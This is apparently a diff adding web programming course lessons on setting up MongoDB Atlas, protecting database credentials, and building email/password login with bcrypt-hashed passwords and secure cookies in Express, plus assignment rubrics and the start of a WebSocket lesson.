+⚠ This [video tutorial](https://www.youtube.com/watch?v=daIH4o75KE8) will step you through the process of creating your account and setting up your database. You really want to watch this video. Note that some of the Atlas website interface may be slightly different, but the basic concepts should all be there in some shape or form. The main steps you need to take are:
+
+1. Create your account.
+1. Create a database cluster.
+1. Create your root database user credentials. Remember these for later use.
+1. ⚠ Set network access to your database to be available from anywhere.
+
+   ![Atlas IP Anywhere](webServicesMongoIpAnywhere.gif)
+
+1. Copy the connection string and use the information in your code.
+1. Save the connection and credential information in your production and development environments as instructed above.
+
+You can always find the connection string to your Atlas cluster by pressing the `Connect` button from your Database > DataServices view.
+
+![Atlas connection string](webServicesMongoConnection.gif)
+
+## Keeping your keys out of your code
+
+You need to protect your credentials for connecting to your Mongo database. One common mistake is to check them into your code and then post it to a public GitHub repository. Instead you can load your credentials when the application executes. One common way to do that is to have a JSON configuration file that contains the credentials that you dynamically load into the JavaScript that makes the database connection. You then use the configuration file in your development environment and deploy it to your production environment, but you **never** commit it to GitHub.
+
+In order to accomplish this do the following:
+
+1. Create a file named `dbConfig.json` in the same directory as the database JavaScript (e.g. `database.js`) that you use to make database requests.
+1. Insert your Mongo DB credentials into the `dbConfig.json` file in JSON format using the following example:
+
+   ```json
+   {
+     "hostname": "cs260.abcdefg.mongodb.net",
+     "userName": "myMongoUserName",
+     "password": "toomanysecrets"
+   }
+   ```
+
+1. Import the `dbConfig.json` content into your `database.js` file using a Node.js require statement and use the data that it represents to create the connection URL.
+
+   ```js
+   const config = require('./dbConfig.json');
+   const url = `mongodb+srv://${config.userName}:${config.password}@${config.hostname}`;
+   ```
+
+⚠ Make sure you include `dbConfig.json` in your `.gitignore` file so that it does not get pushed up to GitHub.
+
+### Testing the connection on startup
+
+It is nice to know that your connection string is correct before your application attempts to access any data. We can do that when the application starts by making an asynchronous request to ping the database. If that fails then either the connection string is incorrect, the credentials are invalid, or the network is not working. The following is an example of testing the connection.
+
+```js
+const config = require('./dbConfig.json');
+
+const url = `mongodb+srv://${config.userName}:${config.password}@${config.hostname}`;
+const client = new MongoClient(url);
+const db = client.db('rental');
+
+(async function testConnection() {
+  await client.connect();
+  await db.command({ ping: 1 });
+})().catch((ex) => {
+  console.log(`Unable to connect to database with ${url} because ${ex.message}`);
+  process.exit(1);
+});
+```
+
+If your server is not starting, then check your logs for this exception being thrown.
+
+## Using Mongo from your code
+
+With that all done, you should be good to use Atlas from both your development and production environments. You can test that things are working correctly with the following example.
+
+```js
+const { MongoClient } = require('mongodb');
+const config = require('./dbConfig.json');
+
+async function main() {
+  // Connect to the database cluster
+  const url = `mongodb+srv://${config.userName}:${config.password}@${config.hostname}`;
+  const client = new MongoClient(url);
+  const db = client.db('rental');
+  const collection = db.collection('house');
+
+  // Test that you can connect to the database
+  (async function testConnection() {
+    await client.connect();
+    await db.command({ ping: 1 });
+  })().catch((ex) => {
+    console.log(`Unable to connect to database with ${url} because ${ex.message}`);
+    process.exit(1);
+  });
+
+  // Insert a document
+  const house = {
+    name: 'Beachfront views',
+    summary: 'From your bedroom to the beach, no shoes required',
+    property_type: 'Condo',
+    beds: 1,
+  };
+  await collection.insertOne(house);
+
+  // Query the documents
+  const query = { property_type: 'Condo', beds: { $lt: 2 } };
+  const options = {
+    sort: { score: -1 },
+    limit: 10,
+  };
+
+  const cursor = collection.find(query, options);
+  const rentals = await cursor.toArray();
+  rentals.forEach((i) => console.log(i));
+}
+
+main().catch(console.error);
+```
+
+To execute the above example, do the following:
+
+1. Create a directory called `mongoTest`
+1. Save the above content to a file named `index.js`
+1. Create a file named `dbConfig.json` that contains your database credentials
+1. Run `npm init -y`
+1. Run `npm install mongodb`
+1. Run `node index.js`.
+
+This should output something like the following if everything is working correctly.
+
+```js
+{
+_id: new ObjectId("639b51b74ef1e953b884ca5b"),
+name: 'Beachfront views',
+summary: 'From your bedroom to the beach, no shoes required',
+property_type: 'Condo',
+beds: 1
+}
+```
+
+# ☑ Assignment
+
+First, set up your MongoDB Atlas database service. Then use the instructions above. Run the example program for testing that you have things set up correctly.
+
+When you are done, submit the hostname for your Atlas database cluster to the Canvas assignment.
+
+Here is an example hostname:
+
+```
+cs260.xiu1cqz.mongodb.net
+```
+
+
+
+# Simon DB
+
+<a id="simon-db"></a>Simon DB:
+[go to top](#top)
+
+![Simon](../simon.png)
+
+This deliverable demonstrates using a database service, MongoDB, to persistently save data. Our web service will call the database service to save high scores. This creates a third layer in our Simon technology stack.
+
+1. Client application - Simple HTML/CSS/JavaScript
+1. Web service - Caddy, Node.js, Express
+1. Database service - MongoDB
+
+You can view this application running here: [Example Simon DB](https://simon-db.cs260.click). However, you won't be able to see any difference from the `simon-service` version, because the only difference is that when the `simon-db` service is restarted it doesn't lose its high score data because it is saved persistently in the database.
+
+## Connecting to the database
+
+We use a cloud service called MongoDB Atlas for our database service. Once we are connected to Atlas, we can make service calls to MongoDB from our web service. This involves specifying the database service endpoint and making database calls like the following.
+
+```Javascript
+const { MongoClient } = require('mongodb');
+
+const url = `mongodb+srv://${userName}:${password}@${hostname}`;
+const client = new MongoClient(url);
+client.connect(err => {
+  const collection = client.db("test").collection("devices");
+
+  // ... perform actions on the DB collection
+
+  client.close();
+});
+
+```
+
+## Create a MongoDB Atlas cluster
+
+Before you can start writing your own code, you need to get a MongoDB Atlas account and create a database cluster that you can use as your database service. If you have not done that yet, go back and review the instruction on data services.
+
+## Handling credentials
+
+Make sure you follow the instruction given previously about providing and protecting your MongoDB credentials in a file named `dbConfig.json`. This file will get deployed to production with the `deployService.sh` script.
+
+## Working with the database
+
+The `database.js` file contains the functions for getting and adding high scores. The database functions are called from the `getScores` and `submitScores` endpoints found in `index.js`.
+
+## Study this code
+
+Get familiar with what this code teaches.
+
+- Clone the repository to your development environment.
+  ```sh
+  git clone https://github.com/webprogramming260/simon-db.git
+  ```
+- Set up your Atlas credentials in a file named `dbConfig.json` that is in the same directory as `database.js`.
+- Add `dbConfig.json` to your `.gitignore` file so that it doesn't put your credentials into GitHub accidentally.
+- Review the code and get comfortable with everything it represents.
+- Debug the code in your browser by hosting it from a VS Code debug session. This [video on debugging a node.js based service](https://youtu.be/B0le_Z_2TQY) will step you through the process.
+
+  ⚠ You will no longer use the `live server` extension to launch your frontend code in the browser since your frontend code will now be served up by the Node.js server you created in `index.js`. Set breakpoints in your backend code inside of Visual Studio.
+
+- See how data is populated in the database by viewing the contents of the database using the MongoDB Atlas console.
+- Make modifications to the code as desired. Experiment and see what happens.
+
+## Deploy to production
+
+- Deploy to your production environment using a copy of the `deployService.sh` script found in the [example class application](https://github.com/webprogramming260/simon-db/blob/main/deployService.sh). Take some time to understand how it works.
+
+  ```sh
+  ./deployService.sh -k <yourpemkey> -h <yourdomain> -s simon
+  ```
+
+  For example,
+
+  ```sh
+  ./deployService.sh -k ~/keys/production.pem -h yourdomain.click -s simon
+  ```
+
+- Update your `startup` repository `notes.md` with what you learned.
+- Make sure your project is visible from your production environment (e.g. https://simon.yourdomain.click).
+
+
+
+# Startup DB
+
+<a id="startup-db"></a>Startup DB:
+[go to top](#top)
+
+Now that you have learned how to set up and use a database, it is time to add that functionality to your startup application. The main things you should focus on in this deliverable include connecting to the database, creating endpoints that accept and return data, storing and retrieving data from the database.
+
+You must use the same startup GitHub repository that you created in the earlier instruction. Update the `notes.md` file with things that you learn as you work on your startup. As you make changes to your HTML, CSS, and JavaScript commit those changes and push them to GitHub. You will need at least four commits to get full credit, but in reality you should have many more than that.
+
+Remember to use the browser's debugger window to debug your frontend HTML, CSS and JavaScript. You can also debug your backend service JavaScript running on Node.js using the built in VS Code Node.js debugger.
+
+Once you have developed your application to where you want it, you need to release it to your production environment. Use the `deployService.sh` script from the [Simon DB repository](https://github.com/webprogramming260/simon-db/blob/main/deployService.sh) and use `startup` for the service parameter (`-s`).
+
+```sh
+./deployService.sh -k <yourpemkey> -h <yourdomain> -s startup
+```
+
+For example,
+
+```sh
+./deployService.sh -k ~/keys/production.pem -h yourdomain.click -s startup
+```
+
+Doing this will make this deliverable of your startup available from `https://startup.yourdomainname`.
+
+## ☑ Assignment
+
+1. Review and deploy Simon DB
+   1. Clone the Simon DB repository to your development environment.
+   1. Run `npm install` in root of the project.
+   1. Open the project in VS Code and examine the application's use of JavaScript to support database interactions.
+   1. Create and configure the `dbConfig.json` file with your MongoDB credentials.
+   1. Execute in your development environment by debugging the application using VS Code's Node.js debugger (press F5 while viewing index.js). Set breakpoints in VS Code and step through the backend JavaScript related to database interactions.
+   1. Open your browser to https://localhost:3000 and use the browser's dev tools to step through the frontend JavaScript using the Source tab.
+   1. Deploy to your production environment using the deployment script so that it is available with your domain's `simon` subdomain.
+1. Add code for connecting to the database
+1. Provide endpoints for adding, updating, and deleting your application data in the database
+1. Persist data in MongoDB.
+1. Display the user data in the frontend by manipulating the DOM.
+1. Make sure your name is displayed in the application and that there is a link to your GitHub repository.
+1. Debug your application using VS Code's Node debugger and the browser's dev tools, in your development environment, to verify it is working correctly.
+1. Periodically commit and push your code to GitHub.
+1. Periodically update your startup repository's `notes.md` file to reflect what you have learned and want to remember.
+1. Push your final version of your project to GitHub.
+1. Deploy your startup application to your production environment (your server).
+1. Make sure your application is available from your production environment.
+1. Upload the URL to your startup application to the Canvas assignment.
+
+## Grading Rubric
+
+- (Required) Simon DB deployed to your production environment
+- (Required) A link to your GitHub startup repository prominently displayed on your application's home page
+- (Required) Notes in your startup Git repository `README.md` file documenting what you modified and added with this deliverable. The TAs will only grade things that have been clearly described as being completed. Review the [voter app](https://github.com/webprogramming260/startup-example) as an example.
+- Application database support
+  - 20% - MongoDB Atlas database created
+  - 40% - Provides backend endpoints for manipulating application data
+  - 30% - Stores application data in MongoDB
+- 10% - Multiple Git commits with meaningful comments.
+
+## Go celebrate
+
+You did it! This is a significant milestone. Time to grab some friends, show them what you did, and celebrate by eating a salad 🥗.
+
+
+
+
+
+# Authorization services
+
+<a id="authorization-service"></a>Authorization Services:
+[go to top](#top)
+
+If your application is going to remember a user's data then it will need a way to uniquely associate the data with a particular credential. That usually means that you `authenticate` a user by asking for information, such as an email address and password. You then remember, for some period of time, that the user has authenticated by storing an `authentication token` on the user's device. Often that token is stored in a [cookie](https://developer.mozilla.org/en-US/docs/Web/HTTP/Headers/Cookie) that is passed back to your web service on each request. The service can now associate data that the user supplies with a unique identifier that corresponds to their authorization token.
+
+![authentication](authServiceAuthenticate.jpg)
+
+Determining what a user is `authorized` to do in your application is also important. For example, you might have different roles in your application such as Administrators, Editors, and Customers. Once you have the ability to authenticate a user and store information about that user, you can also store the authorization for the user. A simple application might have a single field that represents the role of the user. The service code would then use that role to allow, limit, or prevent what a service endpoint does. A complex web application will usually have very powerful authorization representation that controls the user's access to every part of the application. For example, an Editor role might have authorization only to work on content that they created or were invited to.
+
+![authorize](authServiceAuthorize.jpg)
+
+As you might imagine, authentication and authorization can become very complex, very quickly. It is also a primary target for a hacker. If they can bypass the authentication or escalate what they are authorized to do, then they can gain control of your application. Additionally, constantly forcing users to authenticate in a secure way causes users to not want to use an application. This creates opposing priorities: keep the system secure or make it easy to use.
+
+In an attempt to remove the complexity of authentication and authorization from your application, many service providers and package developers have created solutions that you can use. Assuming that you are using a trusted, well-tested service this is an attractive option because it removes the cost of building, testing, and managing that critical infrastructure yourself.
+
+Authorization services often use standard protocols for authenticating and authorizing. These include standards such as [OAuth](https://en.wikipedia.org/wiki/OAuth), [SAML](https://en.wikipedia.org/wiki/Security_Assertion_Markup_Language), and [OIDC](https://en.wikipedia.org/wiki/OpenID). Additionally, they usually support concepts like `Single Sign On` (SSO) and Federated Login. Single sign on allows a user to use the same credentials for multiple web applications. For example, you can log in to GitHub using your Google credentials. Federated login allows a user to log in once, and then the authentication token is reused to automatically log the user in to multiple websites. For example, logging in to Gmail allows you to also use Google Docs and YouTube without logging in again.
+
+For this course we will implement our own authentication using a simple email/password design. Knowing how to implement a simple authentication design will help you appreciate what authentication services provide. If you want to experiment with different authorization services you might consider [AWS Cognito](https://aws.amazon.com/cognito/), or [Google Firebase](https://firebase.google.com/docs/auth).
+
+
+
+
+# Account creation and login
+
+<a id="login"></a>Account creation and login:
+[go to top](#top)
+
+The first step towards supporting authentication in your web application is providing a way for users to uniquely identify themselves. This usually requires two service endpoints. One to initially `create` an authentication credential, and a second to authenticate, or `login`, on future visits. Once a user is authenticated we can control access to other endpoints. For example, web services often have a `getMe` endpoint that gives information about the currently authenticated user. We will implement this endpoint to demonstrate that authentication is actually working correctly.
+
+## Endpoint design
+
+Using HTTP we can map out the design of each of our endpoints.
+
+### Create authentication endpoint
+
+This takes an email and password and returns a cookie containing the authentication token and user ID. If the email already exists it returns a 409 (conflict) status code.
+
+```http
+POST /auth/create HTTP/2
+Content-Type: application/json
+
+{
+  "email":"marta@id.com",
+  "password":"toomanysecrets"
+}
+```
+
+```http
+HTTP/2 200 OK
+Content-Type: application/json
+Set-Cookie: auth=tokenHere
+
+{
+  "id":"337"
+}
+```
+
+### Login authentication endpoint
+
+This takes an email and password and returns a cookie containing the authentication token and user ID. If the email does not exist or the password is bad it returns a 401 (unauthorized) status code.
+
+```http
+POST /auth/login HTTP/2
+Content-Type: application/json
+
+{
+  "email":"marta@id.com",
+  "password":"toomanysecrets"
+}
+```
+
+```http
+HTTP/2 200 OK
+Content-Type: application/json
+Set-Cookie: auth=tokenHere
+
+{
+  "id":"337"
+}
+
+```
+
+### GetMe endpoint
+
+This uses the authentication token stored in the cookie to look up and return information about the authenticated user. If the token or user do not exist it returns a 401 (unauthorized) status code.
+
+```http
+GET /user/me HTTP/2
+Cookie: auth=tokenHere
+```
+
+```http
+HTTP/2 200 OK
+Content-Type: application/json
+
+{
+  "email":"marta@id.com"
+}
+
+```
+
+## Web service
+
+With our service endpoints designed, we can now build our web service using Express.
+
+```js
+const express = require('express');
+const app = express();
+
+app.post('/auth/create', async (req, res) => {
+  res.send({ id: 'user@id.com' });
+});
+
+app.post('/auth/login', async (req, res) => {
+  res.send({ id: 'user@id.com' });
+});
+
+const port = 8080;
+app.listen(port, function () {
+  console.log(`Listening on port ${port}`);
+});
+```
+
+Follow these steps, and then add in the code from the sections that follow. There is a copy of the final version of the example at the end of this instruction. If you get lost, or things are not working as expected, refer to the final version.
+
+1. Create a directory called `authTest` that we will work in.
+1. Save the above content to a file named `main.js`. This is our starting web service.
+1. Run `npm init -y` to initialize the project to work with node.js.
+1. Run `npm install express cookie-parser mongodb uuid bcrypt` to install all of the packages we are going to use.
+1. Run `node main.js` or press `F5` in VS Code to start up the web service.
+1. You can now open a console window and use `curl` to try out one of the endpoints.
+
+   ```sh
+   curl -X POST localhost:8080/auth/create
+   ```
+   ```sh
+   {"id":"user@id.com"}
+   ```
+
+## Handling requests
+
+With our basic service created, we can now implement the create authentication endpoint. The first step is to read the credentials from the body of the HTTP request. Since the body is designed to contain JSON we need to tell Express that it should parse HTTP requests, with a content type of `application/json`, automatically into a JavaScript object. We do this by using the `express.json` middleware. We can then read the email and password directly out of the `req.body` object. We can test that this is working by temporarily including them in the response.
+
+```js
+app.use(express.json());
+
+app.post('/auth/create', (req, res) => {
+  res.send({
+    id: 'user@id.com',
+    email: req.body.email,
+    password: req.body.password,
+  });
+});
+```
+
+```sh
+curl -X POST localhost:8080/auth/create -H 'Content-Type:application/json' -d '{"email":"marta@id.com", "password":"toomanysecrets"}'
+```
+```sh
+{"id":"user@id.com","email":"marta@id.com","password":"toomanysecrets"}
+```
+
+Now that we have proven that we can parse the request bodies correctly, we can change the code to add a check to see if we already have a user with that email address. If we do, then we immediately return a 409 (conflict) status code. Otherwise we create a new user and return the user ID.
+
+```js
+app.post('/auth/create', async (req, res) => {
+  if (await getUser(req.body.email)) {
+    res.status(409).send({ msg: 'Existing user' });
+  } else {
+    const user = await createUser(req.body.email, req.body.password);
+    res.send({
+      id: user._id,
+    });
+  }
+});
+```
+
+## Using the database
+
+We want to persistently store our users in Mongo and so we need to set up our code to connect to and use the database. This code is explained in the instruction on [data services](../dataServices/dataServices.md) if you want to review what it is doing.
+
+```js
+const { MongoClient } = require('mongodb');
+
+const userName = 'holowaychuk';
+const password = 'express';
+const hostname = 'mongodb.com';
+
+const url = `mongodb+srv://${userName}:${password}@${hostname}`;
+
+const client = new MongoClient(url);
+```
+
+With a Mongo collection object we can implement the `getUser` and `createUser` functions.
+
+```js
+function getUser(email) {
+  return collection.findOne({ email: email });
+}
+
+async function createUser(email, password) {
+  const user = {
+    email: email,
+    password: password,
+    token: 'xxx',
+  };
+  return collection.insertOne(user);
+}
+```
+
+But, we are missing a couple of things. We need a real authentication token, and we cannot simply store a clear text password in our database.
+
+## Generating authentication tokens
+
+To generate a reasonable authentication token we use the `uuid` package. [UUID](https://en.wikipedia.org/wiki/Universally_unique_identifier) stands for Universally Unique Identifier, and it does a really good job creating a hard to guess, random, unique ID.
+
+```js
+const uuid = require('uuid');
+
+token: uuid.v4();
+```
+
+## Securing passwords
+
+Next we need to securely store our passwords. Failing to do so is a major security concern. If, and it has happened to many major companies, a hacker is able to access the database, they will have the passwords for all of your users. This may not seem like a big deal if your application is not very valuable, but users often reuse passwords. That means you will also provide the hacker with the means to attack the user on many other websites.
+
+So instead of storing the password directly, we want to cryptographically hash the password so that we never store the actual password. When we want to validate a password during login, we can hash the login password and compare it to our stored hash of the password.
+
+To hash our passwords we will use the `bcrypt` package. This creates a very secure one-way hash of the password. If you are interested in understanding how [bcrypt](https://en.wikipedia.org/wiki/Bcrypt) works, it is definitely worth the time.
+
+```js
+const bcrypt = require('bcrypt');
+
+async function createUser(email, password) {
+  // Hash the password before we insert it into the database
+  const passwordHash = await bcrypt.hash(password, 10);
+
+  const user = {
+    email: email,
+    password: passwordHash,
+    token: uuid.v4(),
+  };
+  await collection.insertOne(user);
+
+  return user;
+}
+```
+
+## Passing authentication tokens
+
+We now need to pass our generated authentication token to the browser when the login endpoint is called, and get it back on subsequent requests. To do this we use HTTP cookies. The `cookie-parser` package provides middleware for cookies and so we will leverage that.
+
+We import the `cookieParser` object and then tell our app to use it. When a user is successfully created, or logs in, we set the cookie header. Since we are storing an authentication token in the cookie, we want to make it as secure as possible, and so we use the `httpOnly`, `secure`, and `sameSite` options.
+
+- `httpOnly` tells the browser to not allow JavaScript running on the browser to read the cookie.
+- `secure` requires HTTPS to be used when sending the cookie back to the server.
+- `sameSite` will only return the cookie to the domain that generated it.
+
+```js
+const cookieParser = require('cookie-parser');
+
+// Use the cookie parser middleware
+app.use(cookieParser());
+
+apiRouter.post('/auth/create', async (req, res) => {
+  if (await DB.getUser(req.body.email)) {
+    res.status(409).send({ msg: 'Existing user' });
+  } else {
+    const user = await DB.createUser(req.body.email, req.body.password);
+
+    // Set the cookie
+    setAuthCookie(res, user.token);
+
+    res.send({
+      id: user._id,
+    });
+  }
+});
+
+function setAuthCookie(res, authToken) {
+  res.cookie('token', authToken, {
+    secure: true,
+    httpOnly: true,
+    sameSite: 'strict',
+  });
+}
+```
+
+## Login endpoint
+
+The login authorization endpoint needs to get the hashed password from the database, compare it to the provided password using `bcrypt.compare`, and if successful set the authentication token in the cookie. If the password does not match, or there is no user with the given email, the endpoint returns status 401 (unauthorized).
+
+```js
+app.post('/auth/login', async (req, res) => {
+  const user = await getUser(req.body.email);
+  if (user) {
+    if (await bcrypt.compare(req.body.password, user.password)) {
+      setAuthCookie(res, user.token);
+      res.send({ id: user._id });
+      return;
+    }
+  }
+  res.status(401).send({ msg: 'Unauthorized' });
+});
+```
+
+## GetMe endpoint
+
+With everything in place to create credentials and login using the credentials, we can now implement the `getMe` endpoint to demonstrate that it all actually works. To implement this we get the user object from the database by querying on the authentication token. If there is not an authentication token, or there is no user with that token, we return status 401 (unauthorized).
+
+```js
+app.get('/user/me', async (req, res) => {
+  authToken = req.cookies['token'];
+  const user = await collection.findOne({ token: authToken });
+  if (user) {
+    res.send({ email: user.email });
+    return;
+  }
+  res.status(401).send({ msg: 'Unauthorized' });
+});
+```
+
+## Final code
+
+Here is the full example code.
+
+```js
+const { MongoClient } = require('mongodb');
+const uuid = require('uuid');
+const bcrypt = require('bcrypt');
+const cookieParser = require('cookie-parser');
+const express = require('express');
+const app = express();
+
+const userName = 'holowaychuk';
+const password = 'express';
+const hostname = 'mongodb.com';
+
+const url = `mongodb+srv://${userName}:${password}@${hostname}`;
+const client = new MongoClient(url);
+const collection = client.db('authTest').collection('user');
+
+app.use(cookieParser());
+app.use(express.json());
+
+// createAuthorization from the given credentials
+app.post('/auth/create', async (req, res) => {
+  if (await getUser(req.body.email)) {
+    res.status(409).send({ msg: 'Existing user' });
+  } else {
+    const user = await createUser(req.body.email, req.body.password);
+    setAuthCookie(res, user.token);
+    res.send({
+      id: user._id,
+    });
+  }
+});
+
+// loginAuthorization from the given credentials
+app.post('/auth/login', async (req, res) => {
+  const user = await getUser(req.body.email);
+  if (user) {
+    if (await bcrypt.compare(req.body.password, user.password)) {
+      setAuthCookie(res, user.token);
+      res.send({ id: user._id });
+      return;
+    }
+  }
+  res.status(401).send({ msg: 'Unauthorized' });
+});
+
+// getMe for the currently authenticated user
+app.get('/user/me', async (req, res) => {
+  authToken = req.cookies['token'];
+  const user = await collection.findOne({ token: authToken });
+  if (user) {
+    res.send({ email: user.email });
+    return;
+  }
+  res.status(401).send({ msg: 'Unauthorized' });
+});
+
+function getUser(email) {
+  return collection.findOne({ email: email });
+}
+
+async function createUser(email, password) {
+  const passwordHash = await bcrypt.hash(password, 10);
+  const user = {
+    email: email,
+    password: passwordHash,
+    token: uuid.v4(),
+  };
+  await collection.insertOne(user);
+
+  return user;
+}
+
+function setAuthCookie(res, authToken) {
+  res.cookie('token', authToken, {
+    secure: true,
+    httpOnly: true,
+    sameSite: 'strict',
+  });
+}
+
+const port = 8080;
+app.listen(port, function () {
+  console.log(`Listening on port ${port}`);
+});
+```
+
+## Experiment
+
+With everything implemented we can use `curl` to try it out. First start up the web service from VS Code by pressing `F5` and selecting `node.js` as the debugger if you have not already done that. You can set breakpoints on all of the different endpoints to see what they do and inspect the different variables. Then open a console window and run the following `curl` commands. You should see similar results as what is shown below. Note that the `-c` and `-b` parameters tell curl to store and use cookies with the given file.
+
+```sh
+curl -X POST localhost:8080/auth/create -H 'Content-Type:application/json' -d '{"email":"지안@id.com", "password":"toomanysecrets"}'
+```
+```sh
+{"id":"639bb9d644416bf7278dde44"}
+```
+
+```sh
+curl -c cookie.txt -X POST localhost:8080/auth/login -H 'Content-Type:application/json' -d '{"email":"지안@id.com", "password":"toomanysecrets"}'
+```
+```sh
+{"id":"639bb9d644416bf7278dde44"}
+```
+
+```sh
+curl -b cookie.txt localhost:8080/user/me
+```
+```sh
+{"email":"지안@id.com"}
+```
+
+
+
+# Simon login
+
+<a id="simon-login"></a>Simon login:
+[go to top](#top)
+
+![Simon](../simon.png)
+
+This deliverable demonstrates authenticating users and storing credentials and authentication tokens in MongoDB.
+
+You can view this application running here: [Example Simon Login](https://simon-login.cs260.click)
+
+![Simon Login](simonLogin.jpg)
+
+## Authorization UI
+
+The `public/index.html`, `public/login.js`, and `public/login.css` files provide all the login UI. Bootstrap provides the styling for the controls.
+
+When `index.html` is loaded an anonymous function in `login.js` determines if the user is already authenticated and uses that state to hide or show the login controls.
+
+When a user logs in, logs out, or creates credentials the service endpoints are called.
+
+## Authorization cookie
+
+The application service uses a secure cookie to store the authorization token for an authenticated user.
+
+```js
+function setAuthCookie(res, authToken) {
+  res.cookie(authCookieName, authToken, {
+    secure: true,
+    httpOnly: true,
+    sameSite: 'strict',
+  });
+}
+```
+
+Note the use of secure, httpOnly, and sameSite. Make sure you are familiar with what each of these mean.
+
+When a user is logged in, the cookie is added. When a user makes a secure request, the cookie is checked. When the user logs out, the cookie is removed.
+
+## Application service endpoints
+
+The service endpoints are contained in `index.js`. The endpoints include `authCreate`, `authLogin`, `authLogout`, and `userGet`. These all work with the database to store and get credentials and update the authorization cookie.
+
+A new Express router, `secureApiRouter` wraps the existing router to add a middleware function that verifies that the authorization cookie is valid before passing the request to endpoints that require authorization. That makes it easy to create secure endpoints by just registering them with `secureApiRouter`.
+
+## Study this code
+
+Get familiar with what this code teaches.
+
+- Clone the repository to your development environment.
+  ```sh
+  git clone https://github.com/webprogramming260/simon-login.git
+  ```
+- Set up your Atlas credentials in a file named `dbConfig.json` that is in the same directory as `database.js`.
+- Add `dbConfig.json` to your `.gitignore` file so that it doesn't put your credentials into GitHub accidentally.
+- Review the code and get comfortable with everything it represents.
+- Debug the code in your browser by hosting it from a VS Code debug session. This [video on debugging a node.js based service](https://youtu.be/B0le_Z_2TQY) will step you through the process.
+
+  ⚠ You will no longer use the `live server` extension to launch your frontend code in the browser since your frontend code will now be served up by the Node.js server you created in `index.js`. Set breakpoints in your backend code inside of Visual Studio.
+
+- See how data is populated in the database by viewing the contents of the database using the MongoDB Atlas console.
+- Make modifications to the code as desired. Experiment and see what happens.
+
+## Deploy to production
+
+- Deploy to your production environment using a copy of the `deployService.sh` script found in the [example class application](https://github.com/webprogramming260/simon-login/blob/main/deployService.sh). Take some time to understand how it works.
+
+  ```sh
+  ./deployService.sh -k <yourpemkey> -h <yourdomain> -s simon
+  ```
+
+  For example,
+
+  ```sh
+  ./deployService.sh -k ~/keys/production.pem -h yourdomain.click -s simon
+  ```
+
+- Update your `startup` repository notes.md with what you learned.
+- Make sure your project is visible from your production environment (e.g. https://simon.yourdomain.click).
+
+
+
+
+# Startup Login
+
+<a id="startup-login"></a>Startup login:
+[go to top](#top)
+
+Now that you have learned how to authenticate and authorize users, it is time to add the ability to login to your startup application. The main things you should focus on in this deliverable include creating and accepting credentials for your user, validating and properly storing credentials in your database, and restricting functionality based on the user's authorized rights.
+
+You must use the same startup GitHub repository that you created in the earlier instruction. Update the notes.md file with things that you learn as you work on your startup. As you make changes to your HTML, CSS, and JavaScript commit those changes and push them to GitHub. You will need at least four commits to get full credit, but in reality you should have many more than that.
+
+Remember to use the browser's debugger window to debug your frontend HTML, CSS and JavaScript. You can also debug your backend service JavaScript running on Node.js using the built in VS Code Node.js debugger.
+
+Once you have developed your application to where you want it, you need to release it to your production environment. Use the `deployService.sh` script from the [Simon DB repository](https://github.com/webprogramming260/simon-db/blob/main/deployService.sh) and use `startup` for the service parameter (`-s`).
+
+```sh
+./deployService.sh -k <yourpemkey> -h <yourdomain> -s startup
+```
+
+For example,
+
+```sh
+./deployService.sh -k ~/keys/production.pem -h yourdomain.click -s startup
+```
+
+Doing this will make this deliverable of your startup available from `https://startup.yourdomainname`.
+
+## ☑ Assignment
+
+1. Review and deploy Simon Login
+   1. Clone the Simon Login repository to your development environment.
+   1. Run `npm install` in root of the project.
+   1. Open the project in VS Code and examine the application's use of JavaScript to support authentication and authorization.
+   1. Create and configure the `dbConfig.json` file with your MongoDB credentials.
+   1. Execute in your development environment by debugging the application using VS Code's Node.js debugger (press F5 while viewing index.js). Set breakpoints in VS Code and step through the backend JavaScript related to login interactions.
+   1. Open your browser to https://localhost:3000 and use the browser's dev tools to step through the frontend JavaScript using the Source tab.
+   1. Deploy to your production environment using the deployment script so that it is available with your domain's `simon` subdomain.
+1. Allow new users to create accounts by providing credentials
+1. Store encrypted credentials in your database
+1. Allow existing users to provide credentials
+1. Authenticate users by comparing provided credentials against those stored in the database
+1. Restrict access to parts of the application that require authorization
+1. Debug your application using VS Code's Node debugger and the browser's dev tools, in your development environment to verify it is working correctly.
+1. Periodically commit and push your code to GitHub.
+1. Periodically update your startup repository's notes.md file to reflect what you have learned and want to remember.
+1. Push your final version of your project to GitHub.
+1. Deploy your startup application to your production environment (your server).
+1. Make sure your application is available from your production environment.
+1. Upload the URL to your startup application to the Canvas assignment.
+
+## Grading Rubric
+
+- (Required) Simon Login deployed to your production environment
+- (Required) A link to your GitHub startup repository prominently displayed on your application's home page
+- (Required) Notes in your startup Git repository README.md file documenting what you modified and added with this deliverable. The TAs will only grade things that have been clearly described as being completed. Review the [voter app](https://github.com/webprogramming260/startup-example) as an example.
+- Application authentication and authorization
+  - 25% - Supports new user registration
+  - 25% - Supports existing user authentication
+  - 20% - Stores and retrieves credentials in MongoDB
+  - 20% - Restricts application functionality based upon authentication
+- 10% - Multiple Git commits with meaningful comments.
+
+## Go celebrate
+
+You did it! This is a significant milestone. Time to grab some friends, show them what you did, and celebrate by making some pancakes 🥞.
+
+
+
+
+
+# WebSocket
+
+<a id="websocket"></a>WebSocket:
+[go to top](#top)
+
+![webSocket](webServicesWebSocketsLogo.png)
+
+HTTP is based on a client-server architecture. A client always initiates the request and the server responds. This is great if you are building a global document library connected by hyperlinks, but for many other use cases it just doesn't work. Applications for notifications, distributed task processing, peer-to-peer communication, or asynchronous events need communication that is initiated by two or more connected devices.
+
+For years, web developers created hacks to work around the limitation of the client/server model. This included solutions like having the client frequently pinging the server to see if the server had anything to say, or keeping client-initiated connections open for a very long time as the client waited for some event to happen on the server. Needless to say, none of these solutions were elegant or efficient.
+
+Finally, in 2011 the communication protocol WebSocket was created to solve this problem. The core feature of WebSocket is that it is fully duplexed. This means that after the initial connection is made from a client, using vanilla HTTP, and then upgraded by the server to a WebSocket connection, the relationship changes to a peer-to-peer connection where either party can efficiently send data at any time.
+
+![WebSocket Upgrade](webServicesWebSocketUpgrade.jpg)
+
+WebSocket connections are still only between two parties. So if you want to facilitate a conversation between a group of users, the server must act as the intermediary. Each peer first connects to the server, and then the server forwards messages amongst the peers.
+
+![WebSocket Peers](webServicesWebSocketPeers.jpg)
+
+## Creating a WebSocket conversation
+
+JavaScript running on a browser can initiate a WebSocket connection with the browser's WebSocket API. First you create a WebSocket object by specifying the port you want to communicate on.
+
+You can then send messages with the `send` function, and register a callback using the `onmessage` function to receive messages.
+
+```js
+const socket = new WebSocket('ws://localhost:9900');
+
+socket.onmessage = (event) => {
+  console.log('received: ', event.data);
+};
+
